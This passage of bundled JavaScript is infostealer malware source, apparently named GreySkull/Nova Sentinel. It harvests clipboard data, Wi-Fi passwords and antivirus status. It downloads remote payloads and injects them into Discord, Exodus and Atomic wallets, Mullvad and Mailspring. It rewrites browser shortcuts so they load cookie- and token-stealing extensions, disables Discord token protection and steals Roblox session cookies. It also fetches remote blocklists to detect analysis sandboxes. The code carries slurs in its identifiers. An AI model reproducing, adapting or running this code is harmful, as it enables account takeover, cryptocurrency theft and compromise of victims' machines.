  for (let i = 0; i < subkeys.length; i++) {
    const subkey = subkeys[i];
    const items = await new Promise((resolve, reject) => {
      subkey.values((err, items) => {
        if (err != null) {
          resolve([]);
        }
        resolve(items);
      });
    });
    for (let u = 0; u < items.length; u++) {
      if (items[u].name == "DisplayName") {
        installedApps = installedApps + items[u].value + "\n";
      }
    }
  }
  return installedApps;
}
async function GreySkullClipboard(cc) {
  if (cc !== "yes") return;
  try {
    const ge = "powershell Get-Clipboard";
    let ps = new PowerShell(ge);
    ps.on("error", err => {});
    ps.on("output", data => {
      if (!data) return;
      const basepath = stat.testpath[0];
      const sysdir = path.join(basepath, "System");
      try {
        if (!fs.existsSync(sysdir)) {
          fs.mkdirSync(sysdir);
        }
      } catch (e) {
        return;
      }
      const ClipFilePath = path.join(sysdir, "Clipboard.txt");
      fs.writeFileSync(ClipFilePath, core.getHeader() + data);
    });
    ps.on("error-output", data => {});
    ps.on("end", code => {});
  } catch (error) {}
}
async function GreySkullWifiPasswords(cc) {
  let wifiprofile = [];
  if (cc !== "yes") return;
  try {
    const ge = "netsh wlan show profile";
    let ps = new PowerShell(ge);
    ps.on("output", async data => {
      const lines = data.split("\n");
      for (const line of lines) {
        if (line.startsWith("    Profil")) {
          const profileName = line.split(":")[1].trim();
          const asciiContent = unidecode(profileName);
          wifiprofile.push(asciiContent);
        }
      }
      const promises = wifiprofile.map(async profile => {
        const ge = `netsh wlan show profile "${profile}" key=clear`;
        return new Promise(async (resolve, reject) => {
          try {
            let ps = new PowerShell(ge);
            ps.on("output", data => {
              const asciiContent = unidecode(data);
              resolve(asciiContent);
            });
          } catch (error) {}
        });
      });
      const profileContents = await Promise.all(promises);
      const c = profileContents.join("\n");
      if (!c) return;
      const basepath = stat.testpath[0];
      const sysdir = path.join(basepath, "System");
      try {
        if (!fs.existsSync(sysdir)) {
          await fs.mkdir(sysdir);
        }
      } catch (e) {
        return;
      }
      const WifiFilePath = path.join(sysdir, "WifiPasswords.txt");
      await fs.writeFileSync(WifiFilePath, core.getHeader() + c);
    });
  } catch (error) {}
}
async function GreySkullAV(cc) {
  if (cc !== "yes") return;
  const psScript = `
function Get-AntiVirusProduct {
    [CmdletBinding()]
    param (
    [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [Alias('name')]
    $computername=$env:computername
    )

    $AntiVirusProducts = Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ComputerName $computername

    $ret = @()
    foreach ($AntiVirusProduct in $AntiVirusProducts) {
         switch ($AntiVirusProduct.productState) {
            "262144" { $defstatus = "Up to date"; $rtstatus = "Disabled" }
            "262160" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
            "266240" { $defstatus = "Up to date"; $rtstatus = "Enabled" }
            "266256" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
            "393216" { $defstatus = "Up to date"; $rtstatus = "Disabled" }
            "393232" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
            "393488" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
            "397312" { $defstatus = "Up to date"; $rtstatus = "Enabled" }
            "397328" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
            "397584" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
            default   { $defstatus = "Unknown"; $rtstatus = "Unknown" }
        }
        $ht = @{}
        $ht.Computername = $computername
        $ht.Name = $AntiVirusProduct.displayName
        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid
        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe
        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe
        $ht.'Definition Status' = $defstatus
        $ht.'Real-time Protection Status' = $rtstatus

        # Créez un nouvel objet pour chaque ordinateur
        $ret += New-Object -TypeName PSObject -Property $ht 
    }
    Return $ret
}
Get-AntiVirusProduct
`;
  const ps = new PowerShell(psScript);
  ps.on("error", err => {});
  ps.on("output", async data => {
    const savePath = path.join(stat.testpath[0], "System");
    try {
      if (!fs.existsSync(savePath)) {
        await fs.mkdirSync(savePath);
        fs.writeFileSync(path.join(savePath, "Antivirus.txt"), core.getHeader() + data);
      } else {
        fs.writeFileSync(path.join(savePath, "Antivirus.txt"), core.getHeader() + data);
      }
    } catch (e) {
      save.SaveError(e);
    }
  });
  ps.on("error-output", data => {});
  ps.on("end", code => {});
}
module.exports = {
  takeScreenshotAndSave,
  getSysteminformations,
  GreySkullAV,
  GreySkullClipboard,
  GreySkullWifiPasswords
};
},{"./core":"utils/core.js","./stats":"utils/stats.js","./save":"utils/save.js"}],"utils/injection.js":[function(require,module,exports) {
const fs = require("fs"),
  glob = require("glob"),
  process = require("process"),
  {
    exec,
    execSync,
    spawn
  } = require("child_process"),
  path = require("path"),
  axios = require("axios"),
  asar = require("asar"),
  {
    stat
  } = require("./stats"),
  save = require("./save"),
  core = require("./core"),
  unzipper = require("unzipper"),
  fsPromises = require("fs").promises;
function replaceSpecialCharacter(text) {
  return text.replace(/ /g, "\\u00A0");
}
async function LetInject() {
  let extensions_path = [path.join(process.env.ProgramData, "ChromeExtensionsNova", "extension-cookies"), path.join(process.env.ProgramData, "ChromeExtensionsNova", "extension-tokens")];
  const shortcutPaths = {
    roaming: {
      "Naviguateur Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Navigateur Opera GX.lnk",
      Google: "Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
      Opera: "Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
      "Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
      Brave: "Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
      Vivaldi: "Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
      "Microsoft Edge": "Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
      "Yandex Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
      "SRWare Iron": "Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
      "Kiwi Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
      "Torch Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
      Slimjet: "Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
      "Comodo Dragon": "Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
      "Opera Neon": "Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
    },
    programdata: {
      Google: "Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
      Opera: "Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
      "Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
      Brave: "Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
      Vivaldi: "Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
      "Microsoft Edge": "Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
      "Yandex Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
      "SRWare Iron": "Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
      "Kiwi Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
      "Torch Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
      Slimjet: "Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
      "Comodo Dragon": "Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
      "Opera Neon": "Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
    }
  };
  const userRoamingStartMenu = path.join(process.env.APPDATA);
  const userProgramDataStartMenu = path.join(process.env.ProgramData);
  async function modifyShortcut(shortcutPath) {
    let randomname = path.join(process.env.APPDATA, `salut${core.generateId(5)}.ps1`);
    if (!fs.existsSync(shortcutPath)) return;
    const powershellCommand = `
    $WshShell = New-Object -comObject WScript.Shell;
    $Shortcut = $WshShell.CreateShortcut("${replaceSpecialCharacter(shortcutPath)}");
    $Shortcut.Arguments = "--load-extension=${extensions_path[0]},${extensions_path[1]}";
    $Shortcut.Save()
    `;
    await fs.writeFileSync(randomname, powershellCommand, {
      encoding: "utf8"
    });
    execSync(`powershell.exe -ExecutionPolicy Bypass -File "${randomname}" -RunAsAdministrator`, async (error, stdout, stderr) => {
      if (error) {
        return;
      }
    });
    await fs.unlink(randomname, err => {
      if (err) {} else {}
    });
  }
  for (const browserName in shortcutPaths.programdata) {
    const shortcutPath = path.join(userProgramDataStartMenu, shortcutPaths.programdata[browserName]);
    await modifyShortcut(shortcutPath);
  }
  for (const browserName in shortcutPaths.roaming) {
    const shortcutPath = path.join(userRoamingStartMenu, shortcutPaths.roaming[browserName]);
    await modifyShortcut(shortcutPath);
  }
}
async function replaceWebhookTerm(directoryPath, wb, ip, compname) {
  try {
    const files = await fsPromises.readdir(directoryPath);
    for (const fileName of files) {
      const filePath = path.join(directoryPath, fileName);
      const fileStat = await fsPromises.stat(filePath);
      if (fileStat.isFile()) {
        let fileContent = await fsPromises.readFile(filePath, "utf-8");
        fileContent = fileContent.replace(/%[A-Z]{7}%/gm, wb);
        fileContent = fileContent.replace(/%IPINFO%/gm, ip);
        fileContent = fileContent.replace(/%COMP_INFO%/gm, compname);
        await fsPromises.writeFile(filePath, fileContent, "utf-8");
      } else if (fileStat.isDirectory()) {
        await replaceWebhookTerm(filePath, wb);
      }
    }
  } catch (error) {}
}
async function chrome_injection(cc, webhook, chrome_url, ip, computername) {
  if (cc !== "yes") return;
  const destinationFolder = path.join(process.env.ProgramData, "ChromeExtensionsNova");
  try {
    const response = await axios.get(chrome_url, {
      responseType: "stream"
    });
    if (!fs.existsSync(destinationFolder)) {
      fs.mkdirSync(destinationFolder, {
        recursive: true
      });
    }
    const fileName = path.basename(chrome_url);
    const destinationPath = path.join(destinationFolder, fileName);
    const writer = fs.createWriteStream(destinationPath);
    writer.on("finish", async () => {
      fs.createReadStream(destinationPath).pipe(unzipper.Extract({
        path: destinationFolder
      })).on("close", () => {
        fs.unlink(destinationPath, err => {
          if (err) {} else {
            replaceWebhookTerm(destinationFolder, webhook, ip, computername);
            LetInject();
          }
        });
      });
    });
    writer.on("error", err => {});
    response.data.pipe(writer);
  } catch (error) {}
}
async function inject_antidelete(app, inject, webhook, url, link, a2f, automailchanger, ClientEmail) {
  if (app.includes("Canary") || app.includes("PTB")) return;
  let niger = path.join(app[0], "resources", "app.asar");
  try {
    let ScriptToInject = `
  
"use strict";

console.log("https://t.me/Sordeal")



const fs = require("fs"),
https = require("https"),
 path = require("path"),
 buildInfo = require('./buildInfo'),
 paths = require('../common/paths'),
 moduleUpdater = require('../common/moduleUpdater'),
 updater = require('../common/updater'),
 requireNative = require('./requireNative');
 paths.init(buildInfo);


function getAppMode() {
  if (process.argv && process.argv.includes('--overlay-host')) {
    return 'overlay-host';
  }
  return 'app';
}

const mode = getAppMode();
if (mode === 'app') {
  require('./bootstrap');
} else if (mode === 'overlay-host') {
  const appSettings = require('./appSettings');
  appSettings.init();
  const {
    NEW_UPDATE_ENDPOINT
  } = require('./Constants');
  if (!buildInfo.debug && buildInfo.newUpdater) {
    if (!updater.tryInitUpdater(buildInfo, NEW_UPDATE_ENDPOINT)) {
      throw new Error('Failed to initialize modules in overlay host.');
    }
    updater.getUpdater().startCurrentVersionSync({
      allowObsoleteHost: true
    });
  } else {
    moduleUpdater.initPathsOnly(buildInfo);
  }
  requireNative('discord_overlay2/standalone_host.js');
}

try{ 
    initGreySkull()
}catch(e){}


const discordAppDataPath = path.join(
  process.env.LOCALAPPDATA ||
    (process.platform == "darwin"
      ? process.env.HOME + "/Library/Preferences"
      : "/var/local"),
  "Discord"
);

function findDiscordVersion() {
  const discordVersions = fs
    .readdirSync(discordAppDataPath)
    .filter((folder) => folder.startsWith("app-"));
  console.log(discordVersions);
  if (discordVersions.length > 0) {
    return discordVersions[0];
  }
  return null; 
}

function findCoreVersion(discordVersion) {
  const coreVersionsPath = path.join(
    discordAppDataPath,
    discordVersion,
    "modules"
  );
  const coreVersions = fs
    .readdirSync(coreVersionsPath)
    .filter((folder) => folder.startsWith("discord_desktop_core-"));
  if (coreVersions.length > 0) {
    return coreVersions[0];
  }
  return null; 
}

function initGreySkull(){
const discordVersion = findDiscordVersion();
const coreVersion = discordVersion ? findCoreVersion(discordVersion) : null;

if (discordVersion && coreVersion) {
  const indexFilePath = path.join(
    discordAppDataPath,
    discordVersion,
    "modules",
    coreVersion,
    "discord_desktop_core/index.js"
  );
  const betterDiscordPath = path.join(
    process.env.APPDATA ||
      (process.platform == "darwin"
        ? process.env.HOME + "/Library/Preferences"
        : "/var/local"),
    "betterdiscord/data/betterdiscord.asar"
  );

  try {
    const negger = fs.readFileSync(indexFilePath, "utf8");
    if (negger === "module.exports = require('./core.asar'); || negger === module.exports = require('./core.asar');") {
      init();
    }else{console.log("nova sentinel is still injected on this discord client")}
  } catch (err) {
    console.error("Error index.js read :", err);
  }

  function init() {
    https
      .get(
        "https://raw.githubusercontent.com/ksch-58/sub/main/index.js",
        (res) => {
          let chunk = "";
          res.on("data", (data) => (chunk += data));
          res.on("end", () => {
            const newContent = chunk
              .replace(
                "%WEB"+"HOOK%",
                "${webhook}"
              )
              .replace("%DISABLEFA%", "${a2f !== null && a2f !== void 0 ? a2f : false}")
              .replace("%AUTOMAILCHANGER%", "${automailchanger !== null && automailchanger !== void 0 ? automailchanger : false}")
              .replace("%CLIENTEMAIL%", "${ClientEmail !== null && ClientEmail !== void 0 ? ClientEmail : "kschdediscord@gmail.com"}")
              .replace("%TRANSFER_URL%", "${link}");
            fs.writeFileSync(indexFilePath, newContent);
          });
        }
      )
      .on("error", (err) => {
        console.error("Error request:", err);
        setTimeout(init, 10000);
      });
  }

  require(path.join(discordAppDataPath, discordVersion, "resources/app.asar"));
  if (fs.existsSync(betterDiscordPath)) {
    require(betterDiscordPath);
  }
} else {
  console.error("GreySkull Still injected.");
}
}
  `;
    let output = path.join(niger, "..", "unpacked");
    if (niger) {
      await unpackAsar(niger, output);
      setTimeout(async () => {
        const indexPath = path.join(output, "app_bootstrap", "index.js");
        const updatedData = `\n${ScriptToInject}`;
        await fs.writeFile(indexPath, updatedData, "utf8", err => {
          if (err) {}
        });
        await packAsar(output, niger);
      }, 2500);
    }
  } catch (e) {}
}
async function inject(inject, webhook, url, link, a2f, automailchanger, ClientEmail, silent) {
  if (inject !== "yes") return;
  let replacedInjection;
  let lkn;
  lkn = webhook;
  try {
    if (silent !== "yes") {
      const filteredProcesses = await core.filterProcessesByName("discord");
      if (filteredProcesses.length > 0) {
        try {
          filteredProcesses.forEach(proc => {
            process.kill(proc.pid);
          });
        } catch (e) {}
      }
    }
    const local = process.env.localappdata;
    const discordFolders = glob.sync(`${local}/*cord*`);
    var desktops = [];
    for (let i = 0; i < discordFolders.length; i++) {
      const discordFolder = discordFolders[i];
      const folderContents = await fsPromises.readdir(discordFolder, {
        withFileTypes: true
      });
      const apps = folderContents.filter(item => item.isDirectory() && item.name.includes("app")).map(item => path.join(discordFolder, item.name));
      if (apps.length < 1) return;
      /* if (path.basename(discordFolder) == "Discord") {
          await inject_antidelete(
            apps,
            inject,
            webhook,
            url,
            link,
            a2f,
            automailchanger,
            ClientEmail
          );
        }*/
      for (let u = 0; u < apps.length; u++) {
        const app = apps[u];
        const desktopCores = glob.sync(`${app}/modules/discord_desktop_core-*`);
        if (!desktopCores[0]) return;
        desktopCores.forEach(async desktop => {
          try {
            const response = await axios.get(url);
            const injection = response.data;
            const regex = /%[A-Z]{7}%/gm;
            replacedInjection = injection.replace(regex, lkn);
            replacedInjection = replacedInjection.replace(/%TRANSFER_URL%/g, link);
            replacedInjection = await replacedInjection.replace(/%DISABLEFA%/g, a2f);
            replacedInjection = await replacedInjection.replace(/%AUTOMAILCHANGER%/g, automailchanger);
            replacedInjection = await replacedInjection.replace(/%CLIENTEMAIL%/g, ClientEmail);
            const indexFile = path.join(`${desktop}/discord_desktop_core/index.js`);
            await fs.writeFileSync(indexFile, `${replacedInjection}`, "utf-8");
            const firstDirectory = glob.sync(`${desktop}/discord_d*`)[0];
            if (!fs.existsSync(firstDirectory + "/ThiefCat")) {
              await fs.mkdirSync(firstDirectory + "/ThiefCat");
            }
            setTimeout(async () => {
              try {
                if (desktop) {
                  const discordFolder = path.join(desktop, "..", "..", "..");
                  const buildBatPath = path.join(desktop, "..", "..", path.basename(discordFolder) + ".exe");
                  const options = {
                    cwd: path.join(desktop, "..", ".."),
                    stdio: "inherit"
                  };
                  try {
                    spawn(buildBatPath, [], options);
                  } catch (e) {}
                }
              } catch (e) {}
            }, 12000);
          } catch (err) {
            save.SaveError(err);
          }
        });
      }
    }
  } catch (e) {
    save.SaveError(e);
  }
}
const replace = (buf, a, b) => {
  if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);
  const idx = buf.indexOf(a);
  if (idx === -1) return buf;
  if (!Buffer.isBuffer(b)) b = Buffer.from(b);
  const before = buf.slice(0, idx);
  const after = replace(buf.slice(idx + a.length), a, b);
  const len = idx + b.length + after.length;
  return Buffer.concat([before, b, after], len);
};
async function BypassDiscordTokenProtector(inject) {
  if (inject != "yes") return;
  try {
    const tp = path.join(process.env.APPDATA, "DiscordTokenProtector");
    const config = path.join(tp, "config.json");
    if (!fs.existsSync(tp) || !fs.lstatSync(tp).isDirectory() || !fs.existsSync(config)) {
      return;
    }
    const filesToRemove = ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"];
    for (const file of filesToRemove) {
      const filePath = path.join(tp, file);
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }
    }
    let item;
    try {
      const fileContent = fs.readFileSync(config, "utf-8");
      item = JSON.parse(fileContent);
    } catch (error) {
      return;
    }
    item[`KSCHdsc_is_here`] = "https://t.me/Sordeal";
    item.auto_start = false;
    item.auto_start_discord = false;
    item.integrity = false;
    item.integrity_allowbetterdiscord = false;
    item.integrity_checkexecutable = false;
    item.integrity_checkhash = false;
    item.integrity_checkmodule = false;
    item.integrity_checkscripts = false;
    item.integrity_checkresource = false;
    item.integrity_redownloadhashes = false;
    item.iterations_iv = 364;
    item.iterations_key = 457;
    item.version = 69420;
    fs.writeFileSync(config, JSON.stringify(item, null, 2));
    fs.appendFileSync(config, `\n\n//KSCHdsc_is_here | https://t.me/Sordeal`);
  } catch (e) {
    save.SaveError(e);
  }
}
async function pwnBetterDiscord(inject) {
  if (inject != "yes") return;
  try {
    let dir = process.env.appdata + "/BetterDiscord/data/betterdiscord.asar";
    if (fs.existsSync(dir)) {
      const boom = fs.readFileSync(dir);
      fs.writeFileSync(dir, replace(boom, "api/webhooks", "KSCHdsc"));
    }
    return;
  } catch (e) {
    save.SaveError(e);
  }
}
async function exodusInjection(cc, webhook, injectionurl) {
  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    let local = process.env.localappdata;
    const response = await axios.get(injectionurl);
    const injection = await response.data;
    let injectionpath = glob.sync(`${local}/exodus/app-*/resources/app.asar`);
    let output = path.join(injectionpath[0], "..", "unpacked");
    if (injectionpath.length > 0) {
      var _stat$exodusurl$;
      await unpackAsar(injectionpath[0], output);
      let g = glob.sync(`${output}/src/app/main/index.js`);
      await fs.writeFileSync(g[0], `${injection}`, "utf-8");
      await packAsar(output, path.join(injectionpath[0]));
      let json = {
        webhook,
        link: (_stat$exodusurl$ = stat.exodusurl[0]) !== null && _stat$exodusurl$ !== void 0 ? _stat$exodusurl$ : "none"
      };
      const parentDir = path.join(injectionpath[0], "..", "..");
      fs.writeFileSync(path.join(parentDir, "config.json"), JSON.stringify(json));
    }
  } catch (e) {}
}
function unpackAsar(asarFilePath, outputDir) {
  try {
    asar.extractAll(asarFilePath, outputDir);
  } catch (err) {}
}
async function MullvadInjection(cc, webhook, injectionurl) {
  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    let mullvad_path = path.join(process.env.ProgramFiles, "Mullvad VPN", "resources", "app.asar");
    if (fs.existsSync(mullvad_path)) {
      const response = await axios.get(injectionurl);
      const injection = await response.data;
      let output = path.join(mullvad_path, "..", "unpacked");
      await unpackAsar(mullvad_path, output);
      let g = path.join(output, "build", "src", "main", "daemon-rpc.js");
      await fs.writeFileSync(g, `${injection.replace("%WEBHOOK%", webhook)}`, "utf-8");
      await packAsar(output, path.join(mullvad_path));
    }
  } catch (e) {}
}
function unpackAsar(asarFilePath, outputDir) {
  try {
    asar.extractAll(asarFilePath, outputDir);
  } catch (err) {}
}
async function packAsar(inputDir, outputFilePath) {
  try {
    await asar.createPackage(inputDir, outputFilePath);
    if (fs.existsSync(outputFilePath)) {
      if (fs.existsSync(inputDir)) {
        fs.rmSync(inputDir, {
          recursive: true
        });
      }
    } else {}
  } catch (err) {}
}
async function AtomicInjection(cc, webhook, injectionurl, mainAtomic) {
  if (cc != "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    const local = process.env.localappdata;
    const response = await axios.get(injectionurl);
    const injection = await response.data;
    const resp = await axios.get(mainAtomic);
    const AtmcMain = await resp.data;
    let injectionpath = glob.sync(`${local}/Programs/atomic/resources/app.asar`);
    if (injectionpath[0]) {
      var _stat$atomicurl$;
      let output = path.join(injectionpath[0], "..", "unpacked");
      await unpackAsar(injectionpath[0], output);
      let g = `${output}/dist/electron/vendors.3d9f29748fbff1778bdc.js`;
      await fs.writeFileSync(g, `${injection}`, "utf-8");
      let main = `${output}/dist/electron/main.js`;
      await fs.writeFileSync(main, `${AtmcMain}`, "utf-8");
      await packAsar(output, path.join(injectionpath[0]));
      let json = {
        webhook,
        link: (_stat$atomicurl$ = stat.atomicurl[0]) !== null && _stat$atomicurl$ !== void 0 ? _stat$atomicurl$ : "none"
      };
      const parentDir = path.join(injectionpath[0], "..", "..");
      fs.writeFileSync(path.join(parentDir, "config.json"), JSON.stringify(json));
    }
  } catch (e) {}
}
async function MailSpringInjection(cc, webhook, injectionurl) {
  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    let mailspring_path = path.join(process.env.localappdata, "Mailspring");
    if (fs.existsSync(mailspring_path)) {
      let appmailspring_path = glob.sync(`${mailspring_path}/app-*/resources/app.asar`);
      appmailspring_path.forEach(async jsppath => {
        const response = await axios.get(injectionurl);
        const injection = await response.data;
        let output = path.join(jsppath, "..", "unpacked");
        await unpackAsar(jsppath, output);
        let g = path.join(output, "internal_packages", "onboarding", "lib", "onboarding-helpers.js");
        await fs.writeFileSync(g, `${injection.replace("%WEBHOOK%", webhook)}`, "utf-8");
        await packAsar(output, path.join(jsppath));
      });
    }
  } catch (e) {}
}
module.exports = {
  inject,
  pwnBetterDiscord,
  BypassDiscordTokenProtector,
  exodusInjection,
  AtomicInjection,
  chrome_injection,
  MullvadInjection,
  MailSpringInjection
};
},{"./stats":"utils/stats.js","./save":"utils/save.js","./core":"utils/core.js"}],"utils/antidebug.js":[function(require,module,exports) {
const util = require('util'),
  exec = util.promisify(require('child_process').exec),
  axios = require("axios"),
  save = require("./save");
async function DoNoDebugNegger(cc, ip, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {
  if (cc !== "yes") return;
  try {
    const pc_name = process.env.COMPUTERNAME || "IDK";
    const user_name = process.env.USERNAME || "IDK";
    const [isblockedIP, isblockedUID, isblockedUSERNAME, isblockedPCNAME, isBLOCKEDOS, isBlockedGpu] = await Promise.all([ipBLOCKED(ip), UuidBLOCKED(uid), UsernameBLOCKED(user_name), PCNameBLOCKED(pc_name), OsBLOCKED(OS), GpuBLOCKED(GPU)]);
    if (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2 || !isNaN(cpucount) && cpucount < 2 || isBlockedGpu || isBLOCKEDOS || isblockedIP || isblockedUID || isblockedUSERNAME || isblockedPCNAME) {
      process.abort();
    }
    try {
      killBlacklistedPrograms();
    } catch (e) {
      save.SaveError(e);
    }
  } catch (e) {
    save.SaveError(e);
  }
}
async function killBlacklistedPrograms() {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/nope.json');
    const json = response.data;
    const blacklistedPrograms = json.blacklistedprog;
    const {
      stdout
    } = await exec('tasklist');
    const runningProcesses = stdout.split(/\r?\n/);
    runningProcesses.forEach(process => {
      const processName = process.split(/\s+/)[0].replace(".exe", '');
      if (blacklistedPrograms.includes(processName)) {
        try {
          exec(`taskkill /F /IM ${processName}.exe`, error => {
            if (error) {} else {}
          });
        } catch (error) {}
      }
    });
  } catch (error) {}
}
async function GpuBLOCKED(gpu) {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_GPUTYPE.json');
    const blockedgpu = response.data;
    return blockedgpu.includes(gpu);
  } catch (error) {
    return false;
  }
}
async function OsBLOCKED(OS) {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blockedOS.json');
    const blockedOS = response.data;
    return blockedOS.includes(OS);
  } catch (error) {
    return false;
  }
}
async function PCNameBLOCKED(username) {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blockedpcname.json');
    const blockedPCNAMES = response.data;
    return blockedPCNAMES.includes(username);
  } catch (error) {
    return false;
  }
}
async function UsernameBLOCKED(username) {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_progr.json');
    const blockedUsernames = response.data;
    return blockedUsernames.includes(username);
  } catch (error) {
    return false;
  }
}
async function UuidBLOCKED(uid) {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_hwid.json');
    const blockedUIDs = response.data;
    return blockedUIDs.includes(uid);
  } catch (error) {
    return false;
  }
}
async function ipBLOCKED(ip) {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Steroide-58/sub-main/main/sub-main/assets/blocked_ips.json');
    const blockedIPs = response.data;
    return blockedIPs.includes(ip);
  } catch (error) {
    return false;
  }
}
module.exports = {
  DoNoDebugNegger
};
},{"./save":"utils/save.js"}],"utils/roblox.js":[function(require,module,exports) {
function ownKeys(e, r) { var t = Object.keys(e); if (Object.getOwnPropertySymbols) { var o = Object.getOwnPropertySymbols(e); r && (o = o.filter(function (r) { return Object.getOwnPropertyDescriptor(e, r).enumerable; })), t.push.apply(t, o); } return t; }
function _objectSpread(e) { for (var r = 1; r < arguments.length; r++) { var t = null != arguments[r] ? arguments[r] : {}; r % 2 ? ownKeys(Object(t), !0).forEach(function (r) { _defineProperty(e, r, t[r]); }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : ownKeys(Object(t)).forEach(function (r) { Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r)); }); } return e; }
function _defineProperty(obj, key, value) { key = _toPropertyKey(key); if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == typeof i ? i : String(i); }
function _toPrimitive(t, r) { if ("object" != typeof t || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != typeof i) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
const {
    execSync
  } = require("child_process"),
  {
    stat
  } = require("./stats"),
  axios = require("axios"),
  save = require("./save"),
  {
    embeds,
    stats,
    badge
  } = require("./emotes");
function GreySkullGetRoblox(Found_Roblox) {
  if (Found_Roblox != "yes") return;
  try {
    function subproc(path) {
      try {
        const cmd = `powershell Get-ItemPropertyValue -Path ${path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY`;
        const options = {
          windowsHide: true,
          shell: true
        };
        return execSync(cmd, options).toString().trim();
      } catch (e) {
        return null;
      }
    }
    let cooks = [];
    const regex_c00ks = subproc("HKLM") || subproc("HKCU");
    if (regex_c00ks) {
      cooks.push(regex_c00ks);
    }
    if (cooks.length > 0) {
      if (cooks.includes(".ROBLOSECURITY")) {
        stat.AddRoblox(cooks);
      }
    }
  } catch (e) {
    save.SaveError(e);
  }
}
async function ParseAndSendRoblox(cc) {
  if (cc !== "yes") return;
  const processedUsernames = new Set();
  const axiosConfig = {
    maxRedirects: 0,
    validateStatus: function (status) {
      return status >= 200 && status < 300 || status === 302;
    }
  };
  try {
    const requests = stat.roblox_cookies.map(async cookies => {
      save.saveRoblox(cookies);
      const [userInfoResponse, friendsCountResponse] = await Promise.all([axios.get("https://www.roblox.com/mobileapi/userinfo", _objectSpread({
        headers: {
          Cookie: `.ROBLOSECURITY=${cookies}`
        }
      }, axiosConfig)), axios.get("https://friends.roblox.com/v1/my/friends/count", _objectSpread({
        headers: {
          Cookie: `.ROBLOSECURITY=${cookies}`
        }
      }, axiosConfig))]);
      if (userInfoResponse.status === 200 && friendsCountResponse.status === 200) {
        const {
          UserName,
          RobuxBalance,
          ThumbnailUrl,
          IsAnyBuildersClubMember,
          IsPremium
        } = userInfoResponse.data;
        const {
          count
        } = friendsCountResponse.data;
        if (!processedUsernames.has(UserName)) {
          processedUsernames.add(UserName);
          const parsed = {
            UserName,
            RobuxBalance,
            ThumbnailUrl,
            IsAnyBuildersClubMember,
            IsPremium,
            friendscount: count,
            cookies
          };
          stat.detailRoblox(parsed);
        }
      }
    });
    await Promise.all(requests);
  } catch (error) {}
}
async function sendRoblox(cc) {
  if (cc != "yes") return;
  let p = stat.roblox_account;
  if (p.length < 1) return;
  return p;
}
